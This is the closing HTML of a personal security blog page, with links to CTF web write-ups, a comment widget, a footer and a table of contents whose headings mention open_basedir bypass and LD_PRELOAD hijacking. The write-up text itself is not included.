<h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2>
</div>
</a>
</article>
<article>
<a href=/2019/06/04/2019qwb/>
<div class=article-details>
<h2 class=article-title>2019强网杯部分Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/30/2019iscc/>
<div class=article-details>
<h2 class=article-title>2019 ISCC Web wp</h2>
</div>
</a>
</article>
<article>
<a href=/2019/05/09/2019ciscn-RefSpace/>
<div class=article-details>
<h2 class=article-title>2019 CISCN RefSpace</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2021 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#description>Description</a></li>
<li><a href=#hacking>Hacking</a></li>
</ol>
<ol>
<li><a href=#description-1>Description</a></li>
<li><a href=#the-first-way-to-hack>The first way to Hack</a>
<ol>
<li><a href=#open_basedir>open_basedir</a></li>
<li><a href=#bypass-open_basedir>Bypass Open_Basedir</a></li>
<li><a href=#ld_preload>LD_PRELOAD</a></li>
<li><a href=#劫持攻击>劫持攻击</a></li>
<li><a href=#getflag>GetFlag</a></li>
<li><a href=#the-other-way>The other way</a></li>
<li><a href=#参考>参考</a></li>
</ol>
</li>
<li><a href=#the-second-way-to-hack>The second way to Hack</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>